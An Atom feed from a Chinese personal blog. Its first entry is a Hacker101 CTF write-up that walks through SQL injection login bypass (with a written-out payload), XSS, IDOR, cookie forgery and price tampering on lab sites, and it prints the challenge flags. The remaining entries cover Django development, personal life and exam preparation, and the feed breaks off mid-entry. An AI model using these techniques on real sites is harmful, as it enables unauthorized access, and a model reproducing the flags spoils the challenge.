<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Louie Liu&#39;s Blog</title>
  
  <subtitle>小菜鸟的blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.rookiehacker.org/"/>
  <updated>2019-11-13T00:57:51.458Z</updated>
  <id>http://blog.rookiehacker.org/</id>
  
  <author>
    <name>John</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hacker101 CTF WriteUp</title>
    <link href="http://blog.rookiehacker.org/2019/11/12/hacker101ctf/"/>
    <id>http://blog.rookiehacker.org/2019/11/12/hacker101ctf/</id>
    <published>2019-11-12T12:46:35.000Z</published>
    <updated>2019-11-13T00:57:51.458Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=428203132&auto=1&height=66"></iframe><h2 id="About-Hacker101-CTF"><a href="#About-Hacker101-CTF" class="headerlink" title="About Hacker101 CTF"></a>About Hacker101 CTF</h2><p>2018 Hacker101 CTF，是由HackerOne举办的，直接使用HackerOne登录即可。<a href="https://ctf.hacker101.com/" target="_blank" rel="noopener">传送门</a></p><p>【2019.11.12】</p><h2 id="A-little-something-to-get-you-started"><a href="#A-little-something-to-get-you-started" class="headerlink" title="A little something to get you started"></a>A little something to get you started</h2><p>难度和flag分值：Trivial (1 / flag)</p><p>WriteUp:</p><p>打开链接查看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background-image: url(&quot;background.png&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Welcome to level 0.  Enjoy your stay.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>发现<code>background.png</code>，添加到链接后访问</p><p>得到flag：<code>^FLAG^05c6d80abb5641043be41332b6868d4e51e5dc899486dda3a44d12c9c2cc5d47$FLAG$`</code></p><h2 id="Micro-CMS-v1"><a href="#Micro-CMS-v1" class="headerlink" title="Micro-CMS v1"></a>Micro-CMS v1</h2><p>难度和flag分值：Easy (2 / flag)</p><p>WriteUp:</p><p>本题目有四个flag。下面分别寻找：</p><p>打开是一个CMS系统，可以创建Markdown类型的页面文件。</p><p>flag1：点击已经存在的几个页面链接发现是以数字分隔的，可能存在注入，尝试直接在edit链接后面加引号，<code>http://34.74.105.127/902d26090b/page/edit/1&#39;</code></p><p>得到flag1:<code>^FLAG^11e4ae63c7deb54c628acac7d6082bdf4573bbae3c81e5fccc035d1709b58c98$FLAG$</code></p><p>flag2：在Home路径下可以看到每篇文章的题目，在编辑页面构造XSS文件标题尝试在Home页面是否存在XSS。</p><p><img src="http://149.28.144.209:8888/images/2019/11/12/3550d20ebf80118120a9706bbc678034.png" alt="图 1"></p><p>创建文章后回到首页</p><p>弹出flag2:<code>^FLAG^c03990c099606a0966e653368894f23422ac22683aaedd2f1cf05fe3e51ebc4b$FLAG$</code></p><p>flag3：在文章内容页面构造XSS，发现标签被过滤了。</p><p><img src="http://149.28.144.209:8888/images/2019/11/12/a7f795388cfadc83fa5c1b1d7d0d624e.png" alt="图 2"></p><p>构造<code>&lt;img&gt;</code>标签如下：</p><p><img src="http://149.28.144.209:8888/images/2019/11/12/7c332dd1ef4974b2c2d4c47733e43025.png" alt="图 3"></p><p>创建文章后访问，弹窗，存在XSS，查看源码</p><p><img src="http://149.28.144.209:8888/images/2019/11/12/d6015d30b4d4c70fa35cca9eabd9e211.png" alt="图 4"></p><p>发现flag3：<code>FLAG^06969e5fad7c4fdbb1373473bca3feaae5cb35192ad076b8c077c8d98ffa6c79$FLAG$</code></p><p>flag4：观察创建的文章ID是从11开始的，已存在的两篇文章ID分别是1和2，那中间的去哪里了？在浏览页面的链接后面一次追加之间的数字都是403，尝试在编辑页面的链接中追加中间的数字</p><p><img src="http://149.28.144.209:8888/images/2019/11/12/3ce72cde9a1f552ff1ce6efddcde6921.png" alt="图 5"></p><p>得到flag4：<code>^FLAG^73f6510533bfe045644c9d7d103f35017ac54fdf8b5517640bf1c884987f0993$FLAG$</code></p><h2 id="Micro-CMS-v2"><a href="#Micro-CMS-v2" class="headerlink" title="Micro-CMS v2"></a>Micro-CMS v2</h2><p>难度和flag分值：Moderate (3 / flag)</p><p>WriteUp:</p><p>本题目有3个flag。下面分别寻找：</p><p>flag1：有登录，尝试是否存在注入。构造登录名为<code>admin &#39; union select &#39;123</code>，密码为<code>123</code>登录成功。查看private page页面</p><p>得到flag1：<code>^FLAG^d2dbfda38f203a282859c13a3da50ee42812417984251fe376dcace56a02e57a$FLAG$</code></p><p>flag2：和CMS v1有点类似，查看hint，发现要采用post方式请求中间ID文章的edit页面</p><p><img src="http://149.28.144.209:8888/images/2019/11/12/91cf6ffe66c032fa86cfe0b6e0af93df.png" alt="图 6"></p><p>得到flag2：<code>^FLAG^18caf2140521df8dfe1c3cf033d74080650e7a3be1f0d3715ea28a6a9de9960d$FLAG$</code></p><p>flag3：在登录页面随便输入用户名密码，提示<code>Unknown user</code></p><p>【待解决】</p><h2 id="Postbook"><a href="#Postbook" class="headerlink" title="Postbook"></a>Postbook</h2><p>难度和flag分值：Easy (4 / flag)</p><p>WriteUp：</p><p>本题目有7个flag。下面分别寻找：</p><p>flag1：注册一个用户，登录后发现已经存在两篇文章，但是id分别为1和3，访问id为2的文章</p><p><img src="http://149.28.144.209:8888/images/2019/11/12/ba22fd1401bf53263a93eb769d22bb92.png" alt="图 7"></p><p>得到flag1：<code>^FLAG^49caa7bbda6269f5b031ef20c3c2c929da30256de5e0aa3ae669f78305db9921$FLAG$</code></p><p>flag2：注册登录后可以发现，在首页只有注册后创建的文章会显示<code>edit</code>按钮，已经存在的并没有。这里通过在编辑链接里通过修改id，直接获取edit权利。尝试在内容中构造XSS并保存。</p><p><img src="http://149.28.144.209:8888/images/2019/11/12/23ae56b6d1e35e870e7564dc9d51ab12.png" alt="图 8"></p><p>得到flag2:<code>^FLAG^a6472d14d9769cef13c37c9a857a6042aa11af11fcc267442b5716a7c5b7b35d$FLAG$</code></p><p>flag3：好吧。。。找了半天，发现在用户名显示的地方是存在XSS的，但是构造好还有XSS的用户名有弹窗但是没有flag。。发现已存在用户除了admin外还有一个user用户，登出后尝试登录user用户，弱密码<code>password</code>，谁料真的登上了。。。</p><p><img src="http://149.28.144.209:8888/images/2019/11/12/a0cb353d9717df175a2b6766079d8966.png" alt="图 9"></p><p>得到flag3：<code>^FLAG^e61c59b72e740c455cf50af04d9d05d0984909e2262afd94d95346aea4491b61$FLAG$</code></p><p>flag4：直接使用burpsuite爆破id字段发现在<code>id=945</code>时存在flag。</p><p>得到flag4：<code>^FLAG^0cae4e96a31362d8c9c11daf0387dec9bf44b2e71b8ef9a69409e468f8d56ffe$FLAG$</code></p><p>flag5：尝试删除文章。发现删除链接id后面跟的是文章id的md5值，这里尝试越权删除其他用户的文章。</p><p><img src="http://149.28.144.209:8888/images/2019/11/13/28071917cb38f4298e9ebad0379bdfee.png" alt="图 10"></p><p>得到flag5：<code>^FLAG^a5d21a4be4c9ed16a98c3d459f75b0984e679dc96eec3ad7c8cbdacc0137bae7$FLAG$</code></p><p>flag6：有了删、改、查，感觉下面就是增了。尝试越权增加一篇文章。先新建一个文章，然后删除并且抓包，发现参数除了title和body外还有一个user_id，这个user_id随着注册人数增加依次增加。这里直接把user_id设置成1之后发送。</p><p><img src="http://149.28.144.209:8888/images/2019/11/13/03535aea1e4d1a3f1ad39f612456be3b.png" alt="图 11"></p><p>得到flag6：<code>^FLAG^3fb398a0f2e9af561c5a12802c8956807d547d23b8d9c5903b114d0c09e4b13d$FLAG$</code> </p><p>flag7：在上面我们删除操作的时候直接使用了id的MD5值，抓包的时候发现用户的Cookie也是一个id=xxxx的哈希值，直接解md5可以发现其直接对应的是user_id，我们登录一个普通用户（我们自己注册的），然后将cookie设置为user_id为2的cookie来冒充用户，发现得到了一个flag和flag3一样，即user用户的flag。所以这里直接想到设置为admin用户的cookie，即user_id为1的cookie，md5(1)的值。刷新页面。</p><p>得到flag7：<code>^FLAG^923ef7586685ba373188fb9000dc76c058e387f614f3a4d8381d63d5a52ba24f$FLAG$</code></p><p>7个flag总算照完了。。。</p><h2 id="Petshop-Pro"><a href="#Petshop-Pro" class="headerlink" title="Petshop Pro"></a>Petshop Pro</h2><p>难度和flag分值：Easy (3 / flag)</p><p>WriteUp：</p><p>本题目有3个flag。下面分别寻找：</p><p>flag1：随便点了一下，发现checkout结算这里有个将单价算一下的操作，这里直接抓包修改购物车cart中相应商品的<code>price</code>为<code>0</code>。</p><p><img src="http://149.28.144.209:8888/images/2019/11/13/aef3f3ef78e255c02d09efaa82690e2c.png" alt="图 12"></p><p>得到flag1：<code>^FLAG^b75dec926d3e2c5ee2a2987d33f1cd510c63094bddda9c86797cb5d3e58dd785$FLAG$</code></p><p>【今日成功拿到52points，顺利拿到两个private program的invitation的优先机会~】</p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/11/12/hacker101ctf/" title="Hacker101 CTF WriteUp">Hacker101 CTF WriteUp</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/11/12/hacker101ctf/" title="Hacker101 CTF WriteUp">http://blog.rookiehacker.org/2019/11/12/hacker101ctf/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      2018 Hacker101 CTF 训练，持续更新中...
    
    </summary>
    
      <category term="CTF" scheme="http://blog.rookiehacker.org/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.rookiehacker.org/tags/CTF/"/>
    
      <category term="Hacker101" scheme="http://blog.rookiehacker.org/tags/Hacker101/"/>
    
  </entry>
  
  <entry>
    <title>Django使用ajax后调用render前端无法跳转</title>
    <link href="http://blog.rookiehacker.org/2019/11/08/renderandajax/"/>
    <id>http://blog.rookiehacker.org/2019/11/08/renderandajax/</id>
    <published>2019-11-08T11:47:52.000Z</published>
    <updated>2019-11-12T05:43:35.268Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>本学期信息安全工程的实验项目。要求做一个基于击键认证（KeyStroke）的项目，可以根据登录用户的信息输入的特征来进行辅助认证。我们这里直接选用了Django来搭建了web登录平台。<code>击键指纹算法</code>的主要步骤如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过键盘敲击时不同的按下及释放时间可以产生如下三种特征值：</span><br><span class="line">1.Hold：同一个按键按下到释放之间的时间间隔</span><br><span class="line">2.Down-Down：第一个按键按下到第二个按键按下之间的时间间隔</span><br><span class="line">3.Up-Down：第一个按键释放到第二个按键按下之间的时间间隔</span><br></pre></td></tr></table></figure><p><img src="http://149.28.144.209:8888/images/2019/11/12/9a184f722a5d79674358e268e1ede6b2.png" alt="图一"></p><p>三元组(Hold, Down-Down, Up-Dwon)在三维坐标中标记一个点的位置。注册时记录用户按键的信息，即一连串三元组组成的点集（在数据库中直接存储按键的时间戳信息），并且设置阈值信息。登录验证时获取登录时的按键信息，重新组织成三元组信息还原成对应点集，之后分别计算相应点的直线距离，如下图所示。若在密码文本信息输入正确的前提下，每个相应点对之间的距离均小于阈值则验证成功。</p><p><img src="http://149.28.144.209:8888/images/2019/11/12/782c4adf0318ec0f68899b424bfd03e9.png" alt="图二"></p><p>前端部分通过js记录用户输入信息时按键的<code>按下</code>和<code>抬起</code>两个瞬间的时间戳信息，传入后端，后端验证判断即可。</p><p>在验证的时候出现了一个问题，前端通过ajax发送的信息，后端使用render做出响应，如果通过验证，提示登录成功并跳转到index页面，但是前端一直没有反应，也没有发生跳转。一开始我以为是代码写的有问题，但是无论怎么改，还是没反应，也无法实现重定向redirect。后来发现原来是使用了ajax的原因。</p><h2 id="关于ajax和Django的render"><a href="#关于ajax和Django的render" class="headerlink" title="关于ajax和Django的render"></a>关于ajax和Django的render</h2><p><a href="https://baike.baidu.com/item/AJAX/8425" target="_blank" rel="noopener">Ajax</a>这个术语源自描述从基于 Web 的应用到基于数据的应用。Ajax 不是一种新的编程语言，而是一种用于创建更好更快以及交互性更强的Web应用程序的技术。使用 JavaScript 向服务器提出请求并处理响应而不阻塞用户核心对象XMLHttpRequest。通过这个对象，您的 JavaScript 可在不重载页面的情况与 Web 服务器交换数据，即在不需要刷新页面的情况下，就可以产生局部刷新的效果。Ajax 在浏览器与 Web 服务器之间使用异步数据传输（HTTP 请求），这样就可使网页从服务器请求少量的信息，而不是整个页面。</p><p>Ajax 是一种独立于 Web 服务器软件的浏览器技术。ajax只是做局部提交，重定向并不是其中的动作，所以无法实现重定向。Ajax只是利用脚本访问对应url获取数据而已，不能做除了获取返回数据以外的其它动作了，所以浏览器端是不会发起重定向的。正常的http请求，只有浏览器和服务器两个参与者。浏览器端发起一个http请求，服务器端处理后发起一个重定向，浏览器端从response中获取到重定向地址，发起另一个http请求。也就是说，浏览器会按照response中的内容进行响应（如重定向），这是浏览器的功能决定的就得响应。</p><p>Ajax请求，参与者就有三个即ajax、客户端、服务器，ajax处于客户端和服务器两者之间。引入ajax后，服务器给浏览器的response被ajax拦截了，但是ajax本身却什么都不做，也不转达。所以前端就一直拿不到后端发送的render/redirect等信息，所以没有反应。那这样该怎么办呢？</p><h2 id="如何解决？"><a href="#如何解决？" class="headerlink" title="如何解决？"></a>如何解决？</h2><p>既然ajax只能获取后端传来的数据而不能执行其他动作，这就意味着通过ajax，前端只能看到后端传来的数据而看不到要执行的动作，那这不就好办了~直接把要执行的动作通过数据信息传送到前端好了，前端通过判断数据信息进而决定要执行什么动作。但是这样也会有一定的安全风险。如果后端发送的数据包被恶意篡改，比如告诉前端去加载输入密码的页面，并且发送到指定的地址，那就有可能会导致敏感信息泄露问题。但是这种方法一般可以通过csrf屏蔽掉。总之，我们是现实了前端能够响应后端的跳转请求了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 后台代码</span><br><span class="line"></span><br><span class="line">###########################################################################</span><br><span class="line"></span><br><span class="line">if check():</span><br><span class="line">message = &quot;注册成功！&quot; # 直接写成中文了，别提多鸡肋了。。。</span><br><span class="line">return JsonResponse(&#123;&apos;msg&apos;: message, &apos;username&apos;: username&#125;)</span><br><span class="line"></span><br><span class="line">###########################################################################</span><br><span class="line"></span><br><span class="line"># 前台代码</span><br><span class="line"></span><br><span class="line">###########################################################################</span><br><span class="line"></span><br><span class="line">success:function(data,status)&#123;</span><br><span class="line">alert(data.msg);</span><br><span class="line">if (data.msg == &apos;注册成功！&apos;)&#123;</span><br><span class="line">window.location = &apos;/login/&apos;; // 注册成功后直接跳转到登录页面</span><br><span class="line">&#125;else&#123;</span><br><span class="line">window.location = &apos;/register/&apos;; // 否则留在登录页面</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###########################################################################</span><br></pre></td></tr></table></figure><p>最后欣赏一下我们做得稀巴烂的登录注册页面吧~</p><p><img src="http://149.28.144.209:8888/images/2019/11/12/75eb419186d411ca9239d4169e00836a.png" alt="注册"></p><p><img src="http://149.28.144.209:8888/images/2019/11/12/969619c5c4dadd909a38830cb67ffa12.png" alt="登录"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/allensakaru/article/details/93672283" target="_blank" rel="noopener">Django中使用ajax无法重定向</a></p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/11/08/renderandajax/" title="Django使用ajax后调用render前端无法跳转">Django使用ajax后调用render前端无法跳转</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/11/08/renderandajax/" title="Django使用ajax后调用render前端无法跳转">http://blog.rookiehacker.org/2019/11/08/renderandajax/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      当我在一个基于Django框架的项目前端部分使用了ajax，后端通过render返回给前端，但是前端并没有按照预期跳转，这是什么原因呢？
    
    </summary>
    
      <category term="Python" scheme="http://blog.rookiehacker.org/categories/Python/"/>
    
    
      <category term="Django" scheme="http://blog.rookiehacker.org/tags/Django/"/>
    
      <category term="前端" scheme="http://blog.rookiehacker.org/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="Windows" scheme="http://blog.rookiehacker.org/tags/Windows/"/>
    
      <category term="漏洞" scheme="http://blog.rookiehacker.org/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Hi!我爱你！</title>
    <link href="http://blog.rookiehacker.org/2019/08/11/mylovestory/"/>
    <id>http://blog.rookiehacker.org/2019/08/11/mylovestory/</id>
    <published>2019-08-11T14:33:55.000Z</published>
    <updated>2019-08-26T15:00:10.595Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=27552499&auto=1&height=66"></iframe><h1 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h1><p>2019年7月27日</p><h1 id="相见"><a href="#相见" class="headerlink" title="相见"></a>相见</h1><p>2019年8月11日<br><img src="http://rookiehacker.org:8888/images/2019/08/26/afdc4b01c431c48630b5e4e7e0153cc4.jpg" alt="于西子湖畔"></p><h1 id="我爱你！"><a href="#我爱你！" class="headerlink" title="我爱你！"></a>我爱你！</h1><p>小锦子！我爱你！</p><h1 id="没有终点"><a href="#没有终点" class="headerlink" title="没有终点"></a>没有终点</h1><p>余生请多多指教~<br><img src="http://rookiehacker.org:8888/images/2019/08/26/2aa90e0e81997d9fa6a35c7c64ab3355.jpg" alt="执子之手，与子偕老"></p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/08/11/mylovestory/" title="Hi!我爱你！">Hi!我爱你！</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/08/11/mylovestory/" title="Hi!我爱你！">http://blog.rookiehacker.org/2019/08/11/mylovestory/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      余生请多多指教~
    
    </summary>
    
      <category term="我的爱情故事" scheme="http://blog.rookiehacker.org/categories/%E6%88%91%E7%9A%84%E7%88%B1%E6%83%85%E6%95%85%E4%BA%8B/"/>
    
    
      <category term="生活" scheme="http://blog.rookiehacker.org/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="情感" scheme="http://blog.rookiehacker.org/tags/%E6%83%85%E6%84%9F/"/>
    
      <category term="爱情" scheme="http://blog.rookiehacker.org/tags/%E7%88%B1%E6%83%85/"/>
    
  </entry>
  
  <entry>
    <title>Django中文件上传的小坑[WIP]</title>
    <link href="http://blog.rookiehacker.org/2019/07/05/djangouploadfile/"/>
    <id>http://blog.rookiehacker.org/2019/07/05/djangouploadfile/</id>
    <published>2019-07-04T16:24:28.000Z</published>
    <updated>2019-08-26T14:51:21.064Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>/<em>更换了电脑硬盘，先测试一下迁移效果~真坑，改日再填~</em>/<br>某日，项目开发过程中，有一部分要涉及到文件的上传，由于项目是使用Django框架搭建的，所以这里看到做这个模块的前辈（此时这位前辈应该已经调到别的组去了。。），直接使用的Django的文件上传模块。可能是一开始只是为了实现文件上传功能吧，看到前辈的代码并没有具体考虑上传过程中的各种具体情况，只是好心地在旁边注释了一下深拷贝和浅拷贝的问题。项目接受后</p><h1 id="关于上传"><a href="#关于上传" class="headerlink" title="关于上传"></a>关于上传</h1><p>Django的文件上传，xxxxxx</p><h1 id="关于深浅copy"><a href="#关于深浅copy" class="headerlink" title="关于深浅copy"></a>关于深浅copy</h1><h2 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h2><p><code>copy.copy</code>,xxxxxx</p><h2 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h2><p><code>copy.deepcopy</code>,xxxxxxxxx</p><h1 id="关于zipfile"><a href="#关于zipfile" class="headerlink" title="关于zipfile"></a>关于zipfile</h1><p><code>zipfile.ZipFile(&#39;xxxx.zip&#39;)</code><br><code>zipfile.is_zipfile(&#39;xxxxx.zip&#39;)</code></p><h1 id="处理方案"><a href="#处理方案" class="headerlink" title="处理方案"></a>处理方案</h1><p>file.seek(0, 0)</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>深浅拷贝<br>zipfile<br>Django文件上传<br>文件指针<br>…</p>]]></content>
    
    <summary type="html">
    
      项目开发过程中用到了Django中的文件上传模块，结果测试的时候发现了bug，处理了一下，对于文件上传和Python的copy又有了新的了解~
    
    </summary>
    
      <category term="Python" scheme="http://blog.rookiehacker.org/categories/Python/"/>
    
    
      <category term="Python" scheme="http://blog.rookiehacker.org/tags/Python/"/>
    
      <category term="Django" scheme="http://blog.rookiehacker.org/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>【考研之路】回首漫漫考研路</title>
    <link href="http://blog.rookiehacker.org/2019/03/30/fightforpku/"/>
    <id>http://blog.rookiehacker.org/2019/03/30/fightforpku/</id>
    <published>2019-03-29T17:56:40.000Z</published>
    <updated>2019-04-20T13:34:03.820Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="写在前边"><a href="#写在前边" class="headerlink" title="写在前边"></a>写在前边</h1><p>漫漫考研路，今日总算可以告一段落了。其实复试完就有预感，录取是板上钉钉的事，但是直到2019年3月26日下午18：25收到拟录取邮件的那一刻，整个悬着的心才算真的放下。如今回过头来，两年时间匆匆而过，不知道自己失去了多少，而又得到了多少。当复试完走出校门，暖暖的阳光打在脸上，和煦的春风吹进了心里，听着最爱的音乐，走在大兴那“乡间的小路上”，一个声音在召唤。哈哈哈哈废话说这么多，我吹不下去了。是时候总结一下这漫长的战斗了。<br><img src="http://rookiehacker.org:8888/images/2019/03/30/81d2cb9d12494f08a3b1087df15e16d5.jpg" alt="北大不是梦~"></p><h1 id="最终成绩"><a href="#最终成绩" class="headerlink" title="最终成绩"></a>最终成绩</h1><p><img src="http://rookiehacker.org:8888/images/2019/03/30/3ec31a818e03ef0a31babb1623cfce55.jpg" alt="拟录取！"><br><img src="http://rookiehacker.org:8888/images/2019/03/30/82589c7aa4999e193f2046b37132b4c8.png" alt="总成绩和总排名（包括技术类非技术类）"><br><img src="http://rookiehacker.org:8888/images/2019/03/30/4b4106eb312306395d1fd317e2f85b61.png" alt="英语一成绩"><br><img src="http://rookiehacker.org:8888/images/2019/03/30/a028ff8637a928c4208972f75920fcf7.png" alt="政治一成绩"><br><img src="http://rookiehacker.org:8888/images/2019/03/30/8687fdcd153f8ce6e8ee632e016be1b0.png" alt="数学一成绩"><br>专业课成绩不能直接网上复核，所以看不到具体小分。</p><h1 id="先从一战说起"><a href="#先从一战说起" class="headerlink" title="先从一战说起"></a>先从一战说起</h1><p>2017年，一战打响。那一年我的目标不在帝都，而在魔都，王师南下，剑指蛤交。本以为万千军中取上将首级本是探囊取物一般，谁料折戟math，败得一塌涂地。其实那一年机会很大，但是战略运用不当，本末倒置，吃了败仗，也许是年轻吧。战绩可谓惨淡，政治英一数一408：58+67+65+105 =295。对，你没看错，数学比英语都低。其实我也是不相信的，我知道考得不好，但是没想到是如此不好。记得走出考场，和室友汇合时（我俩正好分在了同一个考点），他一脸沮丧，生气地对我说下午不考了，要直接回学校。我好说歹说，软磨硬泡把他又拉进了考场，我说我考得也不好，再试试呗，结果谁也说不准呢。就这样一脸懵逼地结束了2天的战斗，失去了梦想一样，晃晃悠悠回到了学校。最后结果出来了，发现平时在一起复习的，一个个都比我考得好。感觉这样子是进不了复试了，但是我还是抱着一丝幻想地在等待着。终于，上交出通知了，专硕线 英语≥55 分;政治≥50 分;业务课一≥70 分;业务 课二≥85 分  总分≥334 。彻底没希望了。但是调剂也没有什么好的选择，身边的同学考的比我好的有学上，考的比我差的也有学上，郁闷死了。其实上海和北京都会有大家所说的压分现象，事实也是如此，公共科目，一般会比其他地区少一些，但是这不是失败的理由，政治英语不谈，总体来说还可以，专业408感觉一般，但也不是非常差，据说那年408均分90，这么看还应该算是中上水平。但是数学，这个为什么这么差呢，我想了一下当时做题的情景，我记忆犹新，做线代时我竟然有点分不清何为等价，何为相似，何为合同、、、、、、其实，这一点都不奇怪，因为复习后期，我就整天只顾做题，没去看课本了，最后那段时间也是全力准备英语和政治，基本上每天安排给数学的时间很少了，所以最后满脑子都是政治英语，这么看数学考成这样，还真不算少。痛定思痛，决定二战，看我卷土重来！<br>毕业的脚步来得飞快，做毕设，拍毕业照，参加毕业典礼，吃散伙饭……一转眼，就要和这个似乎还没有熟悉的校园说再见了，而这段难忘的时光也让自己暂时忘却了一战失利的悲伤。可天下没有不散的宴席，是时候规划一下二战了。凭我对自己的了解，在家效率肯定不高，正好山科有位高中同学也要二战，并且租房什么的也比青岛市里便宜，便决定去山科尝试一下，陌生的环境应该可以让自己更专注吧。其实，第一年并不知道还有软微这么个神奇的地方，凭着对魔都的向往、对Oops战队的崇拜以及对女神的……，我义无反顾选择了sjtu，都说408难，正合我意，结果确实不简单，最后只得了105……而软微，卧槽，我真后悔当初我是多么的死心眼啊，竟然可以有这么好的地方！性价比太高了啊！名额多，科目0少(3门专业课，没有组成)，关键还是北大，然后据说还有300分录取的？？？🤓🤓🤓干！</p><h1 id="开始二战"><a href="#开始二战" class="headerlink" title="开始二战"></a>开始二战</h1><h2 id="预备阶段"><a href="#预备阶段" class="headerlink" title="预备阶段"></a>预备阶段</h2><p>先说教材，这次看了一下网上别人写的经验贴，数学很多人推荐李范全书，李王全书，然后结合自己使用了一年张宇18讲的体会和感悟，觉得张宇的书可能不太适合我，因为看书能看懂，做题不会做😑😑不知道是不是只有我有这个感受(第一年的感受)，可能他的书更适合入门？？然后选了李范全书，专攻高数部分，线代概率铁打的李永乐和王世安，结合他俩的视频，感觉效率很高。然后英语一直都是进行时运转着。英语基础还行吧，四六级裸考分别521、451分不高，但是也懒得复习懒得刷。所以上半年差不多就只是记单词。之前用过各种软件，感觉对自己效果并不好，就整了本考研词汇乱序版，就绿色的那本，挺厚的，50个list，开始时每天一个list，后期速度可以快点。以上上半年，暂且称为预备阶段。6月中旬搬到山科，开始全天候复习！下面详细介绍一下下半年的三个阶段，也是整个复习过程中最重要的阶段。</p><h2 id="第一阶段"><a 